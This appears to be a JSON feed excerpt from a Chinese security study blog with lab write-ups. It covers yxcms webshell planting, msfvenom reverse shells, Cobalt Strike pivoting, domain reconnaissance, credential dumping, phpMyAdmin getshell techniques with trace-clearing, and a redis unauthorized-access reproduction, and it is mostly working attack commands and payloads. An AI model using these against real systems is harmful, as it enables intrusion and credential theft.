data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427171037444.png\" alt=\"image-20220427171037444\" /></p>\n<h3 id=\"yxcms\"><a class=\"anchor\" href=\"#yxcms\">#</a> yxcms</h3>\n<p>后台登陆地址：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMTEuMTIzL3l4Y21zP3I9YWRtaW4=\">http://192.168.11.123/yxcms?r=admin</span></p>\n<p>后台登录账号密码：admin/123456</p>\n<p>前台模板，写入木马文件</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span>@<span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'456'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427163609596.png\" alt=\"image-20220427163609596\" /></p>\n<p>通过备份文件搜索真实路径</p>\n<p>/yxcms/protected/apps/default/view/default/shell.php</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427163402712.png\" alt=\"image-20220427163402712\" /></p>\n<h3 id=\"蚁剑连接\"><a class=\"anchor\" href=\"#蚁剑连接\">#</a> 蚁剑连接</h3>\n<p>为防止中文乱码设置编码为 GBK</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427163745166.png\" alt=\"image-20220427163745166\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427163827072.png\" alt=\"image-20220427163827072\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427171345331.png\" alt=\"image-20220427171345331\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427171330486.png\" alt=\"image-20220427171330486\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427173446192.png\" alt=\"image-20220427173446192\" /></p>\n<h2 id=\"shell提权\"><a class=\"anchor\" href=\"#shell提权\">#</a> shell 提权</h2>\n<h3 id=\"msf\"><a class=\"anchor\" href=\"#msf\">#</a> msf</h3>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># LHOST 为公网 IP 地址，内网地址需做端口转发</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>msfvenom -p windows/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.50.171 <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">4444</span> -f exe -o msf1.exe</pre></td></tr></table></figure><p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220429153729533.png\" alt=\"image-20220429153729533\" /></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msfconsole</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>use exploit/multi/handler</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>show options</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">set</span> LHOST <span class=\"token number\">192.168</span>.50.171</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload windows/meterpreter/reverse_tcp</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>run</pre></td></tr></table></figure><p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220429153908870.png\" alt=\"image-20220429153908870\" /></p>\n<p>可能用到的命令</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">lsof</span> -i:4444</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">kill</span> -9 <span class=\"token string\">'PID'</span></pre></td></tr></table></figure><p>蚁剑关闭防火墙，上传 msf1.exe，执行程序</p>\n<pre><code class=\"language-cmd\"># 关闭防火墙\nnetsh advfirewall set allprofiles state off\n# 执行msf1.exe\nstart C:\\phpStudy\\WWW\\msf1.exe\n</code></pre>\n<pre><code class=\"language-msf\">shell\n# 乱码设置iterm2 preferences-profiles-terminal的encoding为中文\n</code></pre>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220429154012100.png\" alt=\"image-20220429154012100\" /></p>\n<h3 id=\"cs\"><a class=\"anchor\" href=\"#cs\">#</a> cs</h3>\n<p>服务端开启</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>./teamserver <span class=\"token string\">'公网IP'</span> <span class=\"token string\">'连接密码'</span></pre></td></tr></table></figure><p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220429154540761.png\" alt=\"image-20220429154540761\" /></p>\n<p>客户端连接</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220429154621466.png\" alt=\"image-20220429154621466\" /></p>\n<p>设置监听</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220429160257969.png\" alt=\"image-20220429160257969\" /></p>\n<p>生成 payload</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220429160445590.png\" alt=\"image-20220429160445590\" /></p>\n<p>上传木马</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220429160543557.png\" alt=\"image-20220429160543557\" /></p>\n<p>蚁剑执行木马</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220429160624301.png\" alt=\"image-20220429160624301\" /></p>\n<p>beacon 命令</p>\n<p>sleep 0</p>\n<p>shell whoami</p>\n<h2 id=\"内网信息收集\"><a class=\"anchor\" href=\"#内网信息收集\">#</a> 内网信息收集</h2>\n<h3 id=\"msf-2\"><a class=\"anchor\" href=\"#msf-2\">#</a> msf</h3>\n<pre><code class=\"language-cmd\"># 当前用户\nwhoami\n# 主机名\nhostname\n# 本机用户列表\nnet user\n# 本地管理员组\nnet localgroup administrator\n# 系统版本\nsysteminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;\n# 系统架构\necho %PROCESSOR_ARCHITECTURE%\n# 安装软件及版本\nwmic product get name,version\n# 进程与服务\ntasklist\n# IP查询，根据DNS判断是否在域环境\nipconfig/all\n# 局域网内其他主机名\nnet view\n# 查看域用户\nnet view /domain\n# 查询计算机名 全名 用户名 系统版本 工作站 域 登录域\nnet config workstation\n# 查看域控服务器\nnslookup god.org\n# 查看当前域下的所有用户 \nnet user /domain # 若发现能够执行，说明此台机器在域中 (若是此命令在显示域处显示 WORKGROUP，则不存在域，若是报错：发生系统错误 5，则存在域，但当前登录用户不是域用户)\n# 获取域内用户信息\nwmic useraccount get /all\n# 查看域管理员的名字\nnet group &quot;domain admins&quot; /domain\n# 查看所有域成员计算机名\nnet group &quot;domain computers&quot; /domain\n# 查看域管理员\nnet group &quot;domain admins&quot; /domain\n</code></pre>\n<h3 id=\"cs-2\"><a class=\"anchor\" href=\"#cs-2\">#</a> cs</h3>\n<p>msf 派生 shell 给 cs</p>\n<pre><code class=\"language-msf\"># 获取system权限\ngetsystem\n# 放置shell到后台\nbackground\n</code></pre>\n<p>cs 设置监听</p>\n<pre><code class=\"language-msf\">use exploit/windows/local/payload_inject\nshow options\nset DisablePayloadHandler true\nset payload windows/meterpreter/reverse_http\nset lhost 'cs监听地址'\nset lport 'cs监听端口'\nset session 'msf放置到后台的session数字'\nrun\n</code></pre>\n<p>cs</p>\n<p>在 beacon 上右键，目标（target）&gt;net view, 查看下扫描到的主机，在 cs 的 beacon 下，首先要降低心跳，防止杀软警觉，这里是内网，没有杀软就直接 sleep 0</p>\n<p>net view</p>\n<p>点击 target，会显示视图中的目标列表</p>\n<p>target</p>\n<p>在 cs 中，使用 hashdump 抓一下内存的密码，mimikatz 抓注册表的明文密码或散列值</p>\n<p>hashdump</p>\n<p>logonpasswords</p>\n<p>右击 beacon，在视图一栏查看凭证信息，查看相关用户的密码及散列值</p>\n<h2 id=\"内网渗透\"><a class=\"anchor\" href=\"#内网渗透\">#</a> 内网渗透</h2>\n<h3 id=\"cs-3\"><a class=\"anchor\" href=\"#cs-3\">#</a> cs</h3>\n<p>新建监听选择 smb，右键会话 - 执行 - 提权 - 监听器选择 smb payload 选择 svc</p>\n",
            "tags": []
        },
        {
            "id": "https://mo-onstudy.com/2022/01/13/phpmyadmin%E5%90%8E%E5%8F%B0getshell/",
            "url": "https://mo-onstudy.com/2022/01/13/phpmyadmin%E5%90%8E%E5%8F%B0getshell/",
            "title": "phpmyadmin后台getshell",
            "date_published": "2022-01-13T02:41:37.000Z",
            "content_html": "<h2 id=\"select-into-outfile写入\"><a class=\"anchor\" href=\"#select-into-outfile写入\">#</a> select into outfile 写入</h2>\n<h3 id=\"利用条件\"><a class=\"anchor\" href=\"#利用条件\">#</a> 利用条件</h3>\n<ul>\n<li>对 web 目录需要有写权限能够使用单引号 (root)</li>\n<li>知道网站绝对路径 (通过 phpinfo/php 探针 / 报错等)</li>\n<li>secure_file_priv 没有具体值</li>\n</ul>\n<h3 id=\"利用步骤\"><a class=\"anchor\" href=\"#利用步骤\">#</a> 利用步骤</h3>\n<pre><code class=\"language-mysql\"># 查询secure_file_priv值\nshow global variables like '%secure%';\n\n# 写入shell\nselect '&lt;?php eval($_POST[1]);?&gt;' INTO OUTFILE 'C:\\\\phpStudy\\\\WWW\\\\shell.php'\n</code></pre>\n<p>关于 secure_file_priv：</p>\n<p><code>secure_file_priv</code>  是用来限制 load dumpfile、into outfile、load_file () 函数在哪个目录下拥有上传或者读取文件的权限</p>\n<p>当  <code>secure_file_priv</code>  的值为 NULL ，表示限制 mysqld 不允许导入 | 导出，此时无法提权</p>\n<p>当  <code>secure_file_priv</code>  的值为 /tmp/ ，表示限制 mysqld 的导入 | 导出只能发生在 /tmp/ 目录下，此时也无法提权</p>\n<p>当  <code>secure_file_priv</code>  的值没有具体值时，表示不对 mysqld 的导入 | 导出做限制，此时可提权</p>\n<p><code>secure_file_priv</code>  这个值是只读变量，只能通过配置文件修改。如果管理员没有配置，无法进行写入 shell</p>\n<h2 id=\"全局日志写入shell\"><a class=\"anchor\" href=\"#全局日志写入shell\">#</a> 全局日志写入 shell</h2>\n<h3 id=\"利用条件-2\"><a class=\"anchor\" href=\"#利用条件-2\">#</a> 利用条件</h3>\n<ul>\n<li>必须是 root 权限</li>\n</ul>\n<h3 id=\"利用步骤-2\"><a class=\"anchor\" href=\"#利用步骤-2\">#</a> 利用步骤</h3>\n<pre><code class=\"language-mysql\"># 查看配置\nSHOW VARIABLES LIKE '%general%'\n\n# 开启general_log模式\nset global general_log = on;\n\n# 设置日志目录\nset global general_log_file='C:\\\\phpStudy\\\\WWW\\\\shell.php';\n\n# 写入shell\nselect '&lt;?php eval($_POST[cmd]);?&gt;'\n\n# 清除痕迹\nset global general_log_file='C:\\\\phpStudy\\\\MySQL\\\\data\\\\stu1.log';\nset global general_log = off;\n</code></pre>\n<h2 id=\"慢查询日志getshell\"><a class=\"anchor\" href=\"#慢查询日志getshell\">#</a> 慢查询日志 getshell</h2>\n<ul>\n<li>记录所有执行时间超过 long_query_time 秒的所有查询或者不使用索引的查询。默认情况下，MySQL 数据库是不开启慢查询日志的，long_query_time 的默认值为 10（即 10 秒，通常设置为 1 秒），即运行 10 秒以上的语句是慢查询语句。</li>\n</ul>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 查询慢查询日志</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">show</span> variables <span class=\"token operator\">like</span> <span class=\"token string\">'%slow%'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 启用慢查询日志</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">set</span> <span class=\"token keyword\">GLOBAL</span> slow_query_log<span class=\"token operator\">=</span><span class=\"token keyword\">on</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 设置日志路径</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>slow_query_log_file<span class=\"token operator\">=</span><span class=\"token string\">'C:/phpstudy_pro/WWW/2.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># 写入 shell</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token string\">'&lt;?php phpinfo() ?>'</span> <span class=\"token keyword\">from</span> mysql<span class=\"token punctuation\">.</span>db <span class=\"token keyword\">where</span> sleep<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"其他漏洞\"><a class=\"anchor\" href=\"#其他漏洞\">#</a> 其他漏洞</h2>\n<h3 id=\"cve-2018-12613\"><a class=\"anchor\" href=\"#cve-2018-12613\">#</a> Cve-2018-12613</h3>\n<ul>\n<li>phpMyAdmin 4.8.1 和 4.8.0</li>\n</ul>\n<pre><code class=\"language-payload\">http://0-sec.org/index.php?target=db_sql.php%253f/../../../../../../../../windows/win.ini\n</code></pre>\n<h3 id=\"cve-2016-5734\"><a class=\"anchor\" href=\"#cve-2016-5734\">#</a> Cve-2016-5734</h3>\n<ul>\n<li>4.0.10.16 之前的 4.0.x 版本</li>\n<li>4.4.15.7 之前的 4.4.x 版本</li>\n<li>4.6.3 之前的 4.6.x 版本</li>\n</ul>\n<h3 id=\"宝塔phpmyadmin未授权访问漏洞\"><a class=\"anchor\" href=\"#宝塔phpmyadmin未授权访问漏洞\">#</a> 宝塔 phpmyadmin 未授权访问漏洞</h3>\n<ul>\n<li>Linux 正式版 7.4.2 Linux 测试版 7.5.13 Windows 正式版 6.8</li>\n</ul>\n<pre><code class=\"language-payload\">http://xxx.xxx.xxx.xxx:888/pma \n</code></pre>\n<h2 id=\"绝对路径\"><a class=\"anchor\" href=\"#绝对路径\">#</a> 绝对路径</h2>\n<h3 id=\"phpinfo\"><a class=\"anchor\" href=\"#phpinfo\">#</a> phpinfo</h3>\n<p>F12 查看源代码然后搜索 DOCUMENT ROOT 得知写入的绝对路径</p>\n<h3 id=\"报错信息\"><a class=\"anchor\" href=\"#报错信息\">#</a> 报错信息</h3>\n<p>通过各种 fuzz 尝试让目标报错，也有可能爆出绝对路径</p>\n<h3 id=\"集成web框架\"><a class=\"anchor\" href=\"#集成web框架\">#</a> 集成 web 框架</h3>\n<p>如果目标站点是利用 phpstudy、LAMPP 等之类搭建的，可以通过查看数据库路径再拆解 web 路径</p>\n<pre><code>show variables like '%datadir%';\n</code></pre>\n<h3 id=\"select-load_file\"><a class=\"anchor\" href=\"#select-load_file\">#</a> select load_file()</h3>\n<p>利用 select load_file () 读取文件，可以尝试 /etc/passwd，apache｜nginx｜httpd log 之类的文件</p>\n<p>Trick：如何判断目录是否存在，往往确定了 /var/www/html 目录，但是还有一层目录不能确定，可以采用目标域名 + 常用的网站根目录的方式进行爆破，当使用</p>\n<pre><code>select 'test' into outfile '/var/www/$fuzz$/shell.php'；\n</code></pre>\n<p>时，目录 fuzz，fuzz 不存在将会报错</p>\n<pre><code>Can't create/write to file '/var/www/html/666.txt' (Errcode: 2)；\n</code></pre>\n<p>如果存在但是目录写不进去将返回 (Errcode: 13)</p>\n<p>如果使用的</p>\n<pre><code>load data infile &quot;/etc/passwd&quot; into table test;\n</code></pre>\n<p>该语句执行后将也会显示文件是否存在，有权限能否写等信息。</p>\n<h3 id=\"其他\"><a class=\"anchor\" href=\"#其他\">#</a> 其他</h3>\n<ul>\n<li>\n<p>查看数据库表内容获取 有一些 cms 会保存网站配置文件 或者路径</p>\n</li>\n<li>\n<p>进入后台</p>\n</li>\n<li>\n<p>百度出错信息 zoomeye shadon 搜索 error warning</p>\n</li>\n<li>\n<p>@@datadir 参数看 mysql 路径 反猜绝对路径</p>\n</li>\n</ul>\n",
            "tags": [
                "phpmyadmin",
                "getsehll"
            ]
        },
        {
            "id": "https://mo-onstudy.com/2022/01/09/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/",
            "url": "https://mo-onstudy.com/2022/01/09/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/",
            "title": "常用命令",
            "date_published": "2022-01-09T04:23:39.000Z",
            "content_html": "<h2 id=\"macos\"><a class=\"anchor\" href=\"#macos\">#</a> macOS</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 修改 hosts 文件</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token function\">sudo</span> <span class=\"token function\">vi</span> /etc/hosts</pre></td></tr></table></figure><figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># dirmap 显示没有安装模块，尽管已经安装</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>python3 -m pip <span class=\"token function\">install</span> <span class=\"token string\">'模块名字'</span></pre></td></tr></table></figure>",
            "tags": [
                "MacOS",
                "centos",
                "iterm",
                "terminal",
                "bash",
                "shell"
            ]
        },
        {
            "id": "https://mo-onstudy.com/2021/12/31/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/",
            "url": "https://mo-onstudy.com/2021/12/31/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/",
            "title": "redis未授权访问",
            "date_published": "2021-12-31T05:59:06.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>前几日配置爬虫 IP 代理池时安装了 redis，今天在使用 goby 又扫描到一个 redis 未授权访问漏洞，不敢深入挖掘，所以记录一下在靶场环境的复现过程</p>\n<h2 id=\"环境介绍\"><a class=\"anchor\" href=\"#环境介绍\">#</a> 环境介绍</h2>\n<p>攻击机器：<span class=\"kbd red\">macOS</span></p>\n<p>攻击 IP：<span class=\"kbd red\">192.168.1.8</span></p>\n<p>目标机器：<span class=\"kbd red\">centos7</span></p>\n<p>目标 IP：<span class=\"kbd red\">192.168.1.16</span></p>\n<h2 id=\"复现步骤\"><a class=\"anchor\" href=\"#复现步骤\">#</a> 复现步骤</h2>\n<h3 id=\"靶场搭建\"><a class=\"anchor\" href=\"#靶场搭建\">#</a> 靶场搭建</h3>\n<p>在<span class=\"kbd red\"> centos7</span> 使用 [<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxodWIub3JnLw==\">vulhub</span>]{.kbd .red} 搭建<span class=\"kbd red\"> redis 未授权访问</span>漏洞环境</p>\n<h3 id=\"复现步骤-2\"><a class=\"anchor\" href=\"#复现步骤-2\">#</a> 复现步骤</h3>\n<p>使用 nmap 查询信息</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap -A -p <span class=\"token number\">6379</span> --script<span class=\"token operator\">=</span>redis-info <span class=\"token number\">192.168</span>.1.16</pre></td></tr></table></figure><p>显示脚本运行错误</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20211231141352688.png\" alt=\"image-20211231141352688\" /></p>\n<p>根据<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25tYXAvbm1hcC9pc3N1ZXMvMjI5Ng==\">大佬的解决方法</span>修改 redis-info.nes 脚本第 139 行</p>\n<pre><code class=\"language-scripts\">for _, item in ipairs(restab) do\n\tlocal ip = item:match(&quot;addr=%[?([0-9a-f:.]+)%]?:[0-9]+ &quot;)\n\tif not item or 0 == #item then \n\t\tbreak\n\tend\n\tclient_ips[ip] = true;\nend\n</code></pre>\n<p>脚本运行成功</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20211231141757800.png\" alt=\"image-20211231141757800\" /></p>\n<p>使用 redis-cli 连接目标机器的 redis 数据库</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> /usr/local/redis/bin</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>./redis-cli -h <span class=\"token number\">192.168</span>.1.16</pre></td></tr></table></figure><p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20211231143204723.png\" alt=\"image-20211231143204723\" /></p>\n<p>附 攻击者常用命令</p>\n<pre><code>info                       \t\t\t查看信息     \nflushall                 \t \t\t\t删除所有数据库内容：\nflushdb                   \t\t\t刷新数据库\n看所有键：KEYS *，使用select num  可以查看键值数据。\nset test &quot;who am i&quot;        \t\t\t设置变量\nconfig set dir dirpath     \t\t\t设置路径等配置\nconfig get dir/dbfilename  \t\t\t获取路径及数据配置信息\nsave                       \t\t\t保存\nget                        \t\t\t变量，查看变量名称\n</code></pre>\n<p>遇到的错误</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 错误</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>ISCONF Redis is configured to save RDB snapshots, but it is currently not able to persist on disk. Commands that may modify the data <span class=\"token builtin class-name\">set</span> are disabled, because this instance is configured to report errors during writes <span class=\"token keyword\">if</span> RDB snapshotting fails <span class=\"token punctuation\">(</span>stop-writes-on-bgsave-error option<span class=\"token punctuation\">)</span>. Please check the Redis logs <span class=\"token keyword\">for</span> details about the RDB error</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 解决</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>config <span class=\"token builtin class-name\">set</span> stop-writes-on-bgsave-error no</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 错误</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>READONLY You can't <span class=\"token function\">write</span> against a <span class=\"token builtin class-name\">read</span> only slave </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 解决</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>config <span class=\"token builtin class-name\">set</span> slave-read-only no</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 查看</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>config get slave-read-only</pre></td></tr></table></figure>",
            "tags": [
                "redis",
                "未授权访问",
                "漏洞复现"
            ]
        },
        {
            "id": "https://mo-onstudy.com/2021/12/27/Python%E7%88%AC%E8%99%AB%E4%BB%A3%E7%90%86IP%E6%B1%A0%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/",
            "url": "https://mo-onstudy.com/2021/12/27/Python%E7%88%AC%E8%99%AB%E4%BB%A3%E7%90%86IP%E6%B1%A0%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/",
            "title": "Python爬虫代理IP池的搭建与使用",
            "date_published": "2021-12-27T02:58:59.000Z",
            "content_html": "<p>ProxyPool 爬虫代理 IP 池项目，主要功能为定时采集网上发布的免费代理验证入库，定时验证入库的代理保证代理的可用性，提供 API 和 CLI 两种使用方式。同时你也可以扩展代理源以增加代理池 IP 的质量和数量。</p>\n<h2 id=\"环境介绍\"><a class=\"anchor\" href=\"#环境介绍\">#</a> 环境介绍</h2>\n<p>Redis 数据库搭建系统：<span class=\"kbd red\">centos7</span></p>\n<p>centos7 IP：<span class=\"kbd red\">192.168.50.199</span></p>\n<p>proxypool 项目运行系统：<span class=\"kbd red\">macOS</span></p>\n<p>macOS IP：<span class=\"kbd red\">192.168.1.166</span></p>\n<h2 id=\"proxypool项目详情\"><a class=\"anchor\" href=\"#proxypool项目详情\">#</a> ProxyPool 项目详情</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2poYW8xMDQ=\">jhao104</span>/<strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2poYW8xMDQvcHJveHlfcG9vbA==\">proxy_pool</span></strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2poYW8xMDQvcHJveHlfcG9vbCNyZWFkbWU=\">README.md</span></p>\n<details class=\"primary\"><summary>README.md</summary><div>\n<h3 id=\"proxypool-爬虫代理ip池\"><a class=\"anchor\" href=\"#proxypool-爬虫代理ip池\">#</a> ProxyPool 爬虫代理 IP 池</h3>\n<p><a href=\"https://travis-ci.org/jhao104/proxy_pool\"><img data-src=\"https://camo.githubusercontent.com/e1fdabc3e03268cce5b9d242862c30d969135984f9c81627b2ac8e83b52f0ea8/68747470733a2f2f7472617669732d63692e6f72672f6a68616f3130342f70726f78795f706f6f6c2e7376673f6272616e63683d6d6173746572\" alt=\"Build Status\" /></a> <a href=\"http://www.spiderpy.cn/blog/\"><img data-src=\"https://camo.githubusercontent.com/ac93fba4c3b45aeca54b37b19331829460819d9b368c27d0c21518d01f182e8e/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f506f776572656425323062792d406a5f68616f3130342d677265656e2e737667\" alt=\"img\" /></a> <a href=\"https://requires.io/github/jhao104/proxy_pool/requirements/?branch=master\"><img data-src=\"https://camo.githubusercontent.com/dd8752930177bb658386c6a2a541c22dc82930177d599ddd584ca0656b938e78/68747470733a2f2f72657175697265732e696f2f6769746875622f6a68616f3130342f70726f78795f706f6f6c2f726571756972656d656e74732e7376673f6272616e63683d6d6173746572\" alt=\"Requirements Status\" /></a> <a href=\"https://github.com/jhao104/proxy_pool/blob/master/LICENSE\"><img data-src=\"https://camo.githubusercontent.com/7ff41b59b239eb614cf0d3b323cb2ac83aa69dfad7fce02a998947648eb32d93/68747470733a2f2f696d672e736869656c64732e696f2f7061636b61676973742f6c2f646f637472696e652f6f726d2e737667\" alt=\"Packagist\" /></a> <a href=\"https://github.com/jhao104/proxy_pool/graphs/contributors\"><img data-src=\"https://camo.githubusercontent.com/a07f4e7354dd8a5858ef8f109e41f0c88f26fe14978d17f67804fa009d73458c/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f636f6e7472696275746f72732f6a68616f3130342f70726f78795f706f6f6c2e737667\" alt=\"GitHub contributors\" /></a> <a href=\"https://github.com/jhao104/proxy_pool\"><img data-src=\"https://camo.githubusercontent.com/c293033ccfe6212b2a2ca4bab6003840bf647717f2d83f3ef08322630689da62/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6c616e67756167652d507974686f6e2d677265656e2e737667\" alt=\"img\" /></a></p>\n<pre><code>______                        ______             _\n| ___ \\_                      | ___ \\           | |\n| |_/ / \\__ __   __  _ __   _ | |_/ /___   ___  | |\n|  __/|  _// _ \\ \\ \\/ /| | | ||  __// _ \\ / _ \\ | |\n| |   | | | (_) | &gt;  &lt; \\ |_| || |  | (_) | (_) || |___\n\\_|   |_|  \\___/ /_/\\_\\ \\__  |\\_|   \\___/ \\___/ \\_____\\\n                       __ / /\n                      /___ /\n</code></pre>\n<h3 id=\"proxypool\"><a class=\"anchor\" href=\"#proxypool\">#</a> ProxyPool</h3>\n<p>爬虫代理 IP 池项目，主要功能为定时采集网上发布的免费代理验证入库，定时验证入库的代理保证代理的可用性，提供 API 和 CLI 两种使用方式。同时你也可以扩展代理源以增加代理池 IP 的质量和数量。</p>\n<ul>\n<li>文档: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wcm94eS1wb29sLnJlYWR0aGVkb2NzLmlvL3poL2xhdGVzdC8=\">document</span> <a href=\"https://proxy-pool.readthedocs.io/zh/latest/?badge=latest\"><img data-src=\"https://camo.githubusercontent.com/3e0c23afa7a55a5caea9af8840a8e0c5fa921549a67b6debd8c461f3bf4ab246/68747470733a2f2f72656164746865646f63732e6f72672f70726f6a656374732f70726f78792d706f6f6c2f62616467652f3f76657273696f6e3d6c6174657374\" alt=\"Documentation Status\" /></a></li>\n<li>支持版本: <a href=\"https://camo.githubusercontent.com/90d8f7c32cdcf8fa7416df8e80758d3a767608815e127c287830c3008b168a79/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f507974686f6e2d322e782d677265656e2e737667\"><img data-src=\"https://camo.githubusercontent.com/90d8f7c32cdcf8fa7416df8e80758d3a767608815e127c287830c3008b168a79/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f507974686f6e2d322e782d677265656e2e737667\" alt=\"img\" /></a> <a 